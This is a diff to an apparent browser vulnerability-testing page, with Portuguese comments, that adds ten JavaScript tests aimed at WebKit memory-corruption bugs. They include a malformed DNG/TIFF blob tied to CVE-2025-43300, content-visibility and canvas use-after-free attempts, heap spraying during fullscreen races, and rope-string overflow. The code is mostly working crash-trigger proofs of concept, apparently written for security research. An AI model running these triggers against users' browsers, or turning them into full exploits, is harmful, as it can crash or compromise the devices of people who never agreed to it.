@@ -231,7 +231,17 @@
         <button onclick="addLog('Running Test 217...'); test217_FinalChaos()">Test 217: FINAL CHAOS</button>        
         <button onclick="addLog('Running Test 218...'); test218_ICUNormalizeOverflow()">Test 218: ICU Normalize (CVE-2025-43429)</button>
         <button onclick="addLog('Running Test 219...'); test219_DOMWrapperWorldUAF()">Test 219: DOMWrapperWorld UAF</button>
-        <button onclick="addLog('Running Test 220...'); test220_RenderLayerUAF()">Test 220: RenderLayer UAF</button>
+        <button onclick="addLog('Running Test 220...'); test220_RenderLayerUAF()">Test 220: RenderLayer UAF</button>        
+        <button onclick="addLog('Running Test 221...'); test221_DNGImageCrash()">Test 221: Malformed DNG (CVE-2025-43300)</button>
+        <button onclick="addLog('Running Test 222...'); test222_ContentVisibilityUAF()">Test 222: Content-Visibility UAF</button>
+        <button onclick="addLog('Running Test 223...'); test223_FullscreenSprayRace()">Test 223: Fullscreen Heap Spray</button>
+        <button onclick="addLog('Running Test 224...'); test224_AnimationDestructor()">Test 224: CSS Animation Destructor</button>
+        <button onclick="addLog('Running Test 225...'); test225_RopeStringOverflow()">Test 225: Rope String Overflow</button>      
+        <button onclick="addLog('Running Test 226...'); test226_FullscreenTeardown()">Test 226: Fullscreen Teardown</button>
+        <button onclick="addLog('Running Test 227...'); test227_FullscreenRace()">Test 227: Fullscreen Race</button>
+        <button onclick="addLog('Running Test 228...'); test228_AnimationRemoval()">Test 228: Animation Removal</button>
+        <button onclick="addLog('Running Test 229...'); test229_CanvasContextUAF()">Test 229: Canvas Context UAF</button>
+        <button onclick="addLog('Running Test 230...'); test230_ContentVisibilityRemove()">Test 230: Content-Visibility Remove</button>
     </div>
     
 
@@ -5823,6 +5833,314 @@
 
             } catch(e) {
                 addLog('Test 220 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+        // TEST 221: DNG Image Processing Memory Corruption (CVE-2025-43300)
+        // Tenta carregar um Blob com cabeçalho TIFF/DNG forjado para triggar o parser de imagem
+        function test221_DNGImageCrash() {
+            addLog('TEST 221: Attempting Malformed DNG Image Load');
+            try {
+                // Header TIFF/DNG básico (Little Endian) + Lixo para causar OOB Read/Write
+                // 49 49 2A 00 (TIFF Header)
+                const header = new Uint8Array([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00]); 
+                const junk = new Uint8Array(1024 * 1024); // 1MB de lixo
+                for(let i=0; i<junk.length; i++) junk[i] = Math.random() * 255;
+                
+                const blob = new Blob([header, junk], {type: 'image/tiff'}); // DNG é baseado em TIFF
+                const url = URL.createObjectURL(blob);
+                
+                const img = document.createElement('img');
+                testArea.appendChild(img);
+                
+                img.onload = () => URL.revokeObjectURL(url);
+                img.onerror = () => {
+                    addLog('Image load failed (Expected if format not parsed, but might crash kernel if parsed)');
+                    URL.revokeObjectURL(url);
+                };
+                
+                // Força o navegador a tentar decodificar como imagem
+                img.src = url;
+            } catch(e) {
+                addLog('Test 221 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 222: WebKit Heap UAF in RenderLayer (via content-visibility)
+        // O texto menciona explicitamente "CSS content-visibility and DOM removals"
+        function test222_ContentVisibilityUAF() {
+            addLog('TEST 222: content-visibility + DOM Removal UAF');
+            try {
+                const container = document.createElement('div');
+                const child = document.createElement('div');
+                child.innerHTML = '<b>Layer Content</b><p>More Content</p>';
+                // Estilo para forçar criação de RenderLayer
+                child.style.cssText = 'contain: content; width: 100px; height: 100px; background: red;';
+                
+                container.appendChild(child);
+                testArea.appendChild(container);
+                
+                // Loop rápido alternando visibilidade e removendo nós
+                let count = 0;
+                const i = setInterval(() => {
+                    if (count++ > 50) { clearInterval(i); return; }
+                    
+                    // 1. Oculta conteúdo (otimização de layer)
+                    child.style.contentVisibility = 'hidden';
+                    
+                    // 2. Força reflow parcial
+                    container.offsetWidth;
+                    
+                    // 3. Remove conteúdo interno enquanto oculto
+                    child.innerHTML = '';
+                    
+                    // 4. Restaura visibilidade (Tenta pintar layer com conteúdo removido)
+                    child.style.contentVisibility = 'visible';
+                    child.innerHTML = '<b>Respawn</b>';
+                }, 10);
+            } catch(e) {
+                addLog('Test 222 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 223: Exiting Fullscreen During Heap-Spray
+        // O texto cita crash ao entrar/sair de fullscreen DURANTE heap spray
+        function test223_FullscreenSprayRace() {
+            addLog('TEST 223: Fullscreen Toggle + Heap Spray');
+            try {
+                const div = document.createElement('div');
+                div.style.background = 'blue';
+                div.textContent = 'Fullscreen Spray Target';
+                testArea.appendChild(div);
+                
+                // 1. Inicia Heap Spray Assíncrono
+                let spray = [];
+                const sprayer = setInterval(() => {
+                    const arr = new Uint32Array(0x10000);
+                    for(let i=0; i<arr.length; i++) arr[i] = 0x41414141;
+                    spray.push(arr);
+                    if (spray.length > 500) spray = []; // Evita OOM total, foca na atividade de alocação
+                }, 5);
+                
+                // 2. Tenta entrar e sair de fullscreen rapidamente
+                if (div.webkitRequestFullscreen) {
+                    div.webkitRequestFullscreen();
+                    
+                    setTimeout(() => {
+                        if (document.webkitExitFullscreen) {
+                            document.webkitExitFullscreen();
+                        }
+                        clearInterval(sprayer);
+                    }, 200); // Janela de tempo crítica mencionada no report
+                } else {
+                    addLog('Fullscreen API not available, skipping toggle');
+                    clearInterval(sprayer);
+                }
+            } catch(e) {
+                addLog('Test 223 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 224: Bug in WebCore::CSSAnimation
+        // Foca em instabilidade durante conteúdo animado
+        function test224_AnimationDestructor() {
+            addLog('TEST 224: CSS Animation + Stylesheet Destruição');
+            try {
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes crash { 0% { opacity: 1; transform: scale(1); } 100% { opacity: 0; transform: scale(0); } }
+                    .anim { animation: crash 0.1s infinite; }
+                `;
+                document.head.appendChild(style);
+                
+                const div = document.createElement('div');
+                div.className = 'anim';
+                div.textContent = 'Animating...';
+                testArea.appendChild(div);
+                
+                div.addEventListener('animationstart', () => {
+                    // Remove o stylesheet que define a animação DURANTE o evento de início
+                    // Isso pode confundir o WebCore AnimationController
+                    if (style.parentNode) style.parentNode.removeChild(style);
+                    testArea.removeChild(div);
+                });
+                
+                // Força início
+                div.style.display = 'none';
+                div.offsetHeight;
+                div.style.display = 'block';
+            } catch(e) {
+                addLog('Test 224 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 225: Unknown Heap and String Overflow (Rope Attack)
+        // O texto cita "Overflow in string handling". Tentaremos criar strings "Rope" (concatenadas) massivas
+        function test225_RopeStringOverflow() {
+            addLog('TEST 225: Recursive String Concatenation (Rope Overflow)');
+            try {
+                let s = "A";
+                // Crescimento exponencial para testar limites de alocação de String no JSC
+                for (let i = 0; i < 28; i++) {
+                    s += s; // Cria ConsString (Rope) internamente no WebKit
+                }
+                
+                // Tenta forçar a "flattening" da string (conversão de Rope para vetor contíguo)
+                // Isso muitas vezes trigga OOM ou Overflow se o cálculo de tamanho falhar
+                const sub = s.substring(s.length - 100);
+                const div = document.createElement('div');
+                
+                // Atribui ao DOM para forçar processamento
+                div.className = sub; 
+                testArea.appendChild(div);
+                addLog('String length created: ' + s.length);
+            } catch(e) {
+                addLog('Test 225 Exception (Likely OOM): ' + e.message, true);
+                crashes++;
+            }
+        }
+        // TEST 226: Violent Teardown during Fullscreen Transition
+        function test226_FullscreenTeardown() {
+            addLog('TEST 226: Clearing DOM during webkitfullscreenchange');
+            try {
+                const target = document.createElement("div");
+                target.style.height = "200vh";
+                target.style.background = "red";
+                testArea.appendChild(target);
+
+                const handler = () => {
+                    // Teardown violento durante transição
+                    // Usamos testArea.innerHTML para não apagar a ferramenta inteira, 
+                    // mas o efeito no renderizador é similar.
+                    testArea.innerHTML = "";
+                    const p = document.createElement('p');
+                    p.textContent = "DOM REMOVED";
+                    testArea.appendChild(p);
+                    document.removeEventListener("webkitfullscreenchange", handler);
+                };
+
+                document.addEventListener("webkitfullscreenchange", handler, { once: true });
+
+                if (target.webkitRequestFullscreen) {
+                    target.webkitRequestFullscreen();
+                } else {
+                    addLog('Fullscreen API not supported');
+                }
+            } catch(e) {
+                addLog('Test 226 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 227: Fullscreen Enter/Exit Race
+        function test227_FullscreenRace() {
+            addLog('TEST 227: Fullscreen Request/Exit Race (0ms)');
+            try {
+                const el = document.createElement('div');
+                el.style.background = 'blue';
+                testArea.appendChild(el);
+
+                if (el.webkitRequestFullscreen) {
+                    el.webkitRequestFullscreen();
+
+                    // Saída imediata (race condition)
+                    setTimeout(() => {
+                        if (document.webkitExitFullscreen) {
+                            document.webkitExitFullscreen();
+                        }
+                    }, 0);
+                }
+            } catch(e) {
+                addLog('Test 227 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 228: Animation Removal during Render
+        function test228_AnimationRemoval() {
+            addLog('TEST 228: Removing animated node during render');
+            try {
+                // Injetar CSS
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes spin228 { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+                    .box228 {
+                        width: 100px;
+                        height: 100px;
+                        background: blue;
+                        animation: spin228 0.2s infinite linear;
+                    }
+                `;
+                document.head.appendChild(style);
+
+                const box = document.createElement('div');
+                box.className = 'box228';
+                testArea.appendChild(box);
+
+                setTimeout(() => {
+                    // Remover nó animado em pleno render
+                    box.remove();
+                    // Limpar estilo
+                    document.head.removeChild(style);
+                    addLog('Animated node removed');
+                }, 50);
+            } catch(e) {
+                addLog('Test 228 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 229: Canvas Context Use-After-Free
+        function test229_CanvasContextUAF() {
+            addLog('TEST 229: Canvas removal + Context access');
+            try {
+                const c = document.createElement("canvas");
+                c.width = 256;
+                c.height = 256;
+                testArea.appendChild(c);
+                
+                const ctx = c.getContext("2d");
+                ctx.fillRect(0,0,256,256);
+
+                // Remover canvas
+                c.remove();
+
+                // Usar contexto depois (UAF attempt)
+                setTimeout(() => {
+                    try {
+                        ctx.getImageData(0,0,10,10);
+                        addLog('getImageData called on removed canvas ctx');
+                    } catch(e) {
+                        addLog('Context access failed (handled): ' + e.message);
+                    }
+                }, 50);
+            } catch(e) {
+                addLog('Test 229 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 230: Content-Visibility Auto Removal
+        function test230_ContentVisibilityRemove() {
+            addLog('TEST 230: content-visibility: auto + removal');
+            try {
+                const el = document.createElement("div");
+                el.style.contentVisibility = "auto";
+                el.style.height = "2000px";
+                el.style.background = "green";
+                el.textContent = "BIG CONTENT";
+                testArea.appendChild(el);
+
+                setTimeout(() => {
+                    el.remove();
+                    addLog('content-visibility element removed');
+                }, 50);
+            } catch(e) {
+                addLog('Test 230 Exception: ' + e.message, true);
                 crashes++;
             }
         }
